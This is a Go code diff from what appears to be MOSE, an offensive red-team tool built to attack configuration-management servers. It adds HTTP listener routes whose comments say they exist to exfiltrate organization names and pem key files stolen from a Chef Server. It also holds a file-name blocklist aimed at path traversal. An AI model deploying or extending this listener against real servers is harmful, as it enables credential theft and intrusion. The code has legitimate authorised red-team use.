@@ -1,8 +1,13 @@
+// Copyright 2019 National Technology & Engineering Solutions of Sandia, LLC (NTESS).
+// Under the terms of Contract DE-NA0003525 with NTESS,
+// the U.S. Government retains certain rights in this software.
+
 package main
 
 import (
 	"context"
-	"github.com/l50/mose/pkg/utils"
+	"encoding/json"
+	"github.com/l50/mose/pkg/moseutils"
 	"io"
 	"log"
 	"net/http"
@@ -11,7 +16,8 @@ import (
 	"time"
 )
 
-// Make sure no maliciousness can happen with overwriting a file on the operator's system
+// checkInvalidChars detects invalid (and potentially malicious)
+// characters from being used in a file name string
 func checkInvalidChars(file string) {
 	var disallowedChars = []string{
 		"..",
@@ -52,10 +58,13 @@ func checkInvalidChars(file string) {
 	}
 }
 
+// fileUpload is used to upload files to a listener
 func fileUpload(w http.ResponseWriter, r *http.Request) {
-	log.Println("File Upload Endpoint Hit")
 
-	r.ParseMultipartForm(10 << 20)
+	// Limit file uploads to 10 MB files
+	if err := r.ParseMultipartForm(10 << 20); err != nil {
+		log.Println(err)
+	}
 
 	file, handler, err := r.FormFile("file")
 	if err != nil {
@@ -63,8 +72,6 @@ func fileUpload(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 	defer file.Close()
-
-	log.Printf("%v", handler.Header)
 
 	checkInvalidChars(handler.Filename)
 
@@ -76,24 +83,59 @@ func fileUpload(w http.ResponseWriter, r *http.Request) {
 	}
 	defer f.Close()
 
-	io.Copy(f, file)
+	if _, err := io.Copy(f, file); err != nil {
+		log.Println(err)
+		return
+	}
+
 	log.Printf("Successfully uploaded %v", handler.Filename)
 }
 
-func createUploadRoute() {
-	// TODO: Use HTTPS - https://github.com/ryhanson/phishery/blob/master/phish/phishery.go
-	ip, err := utils.GetLocalIP()
+// orgUpload is used to exfil org names from a Chef Server
+func orgUpload(w http.ResponseWriter, r *http.Request) {
+	type Org struct {
+		Name string
+	}
+	var org Org
+	if r.Body == nil {
+		http.Error(w, "Please send a request body", 400)
+		return
+	}
+	err := json.NewDecoder(r.Body).Decode(&org)
 	if err != nil {
-		log.Fatalln(err)
+		http.Error(w, err.Error(), 400)
+		return
+	}
+	log.Printf("Successfully uploaded %v", org.Name)
+	// TODO support multiple orgs
+	targetOrgName = strings.TrimSpace(org.Name)
+}
+
+// createUploadRoute is used to create an exfil route
+// that can be used to steal org names and pem files from a Chef Server
+func createUploadRoute(localIP string, localPort int) {
+	timeToServe := 30
+	var ip string
+	if localIP == "" {
+		ip, _ = moseutils.GetLocalIP()
+		if ip == "" {
+			log.Fatalln("Unable to get local IP address")
+		}
+	} else {
+		ip = localIP
 	}
 	if _, err := os.Stat("keys"); os.IsNotExist(err) {
-		utils.CreateFolders([]string{"keys"})
+		moseutils.CreateFolders([]string{"keys"})
 	}
 
 	http.HandleFunc("/upload", fileUpload)
-	msg("Listener being served at http://%s:%s/%s-%s for %d seconds", ip, "8081", cmTarget, osTarget, 10)
-	srv := utils.StartHttpServer(8081, "")
-	time.Sleep(10 * time.Second)
+	http.HandleFunc("/org", orgUpload)
+	proto := "http"
+	if serveSSL {
+		proto = "https"
+	}
+	msg("Listener being served at %s://%s:%d/%s-%s for %d seconds", proto, ip, localPort, cmTarget, osTarget, timeToServe)
+	srv := moseutils.StartServer(localPort, "", serveSSL, sslCertPath, sslKeyPath, time.Duration(timeToServe)*time.Second, false)
 
 	info("Web server shutting down...")
 
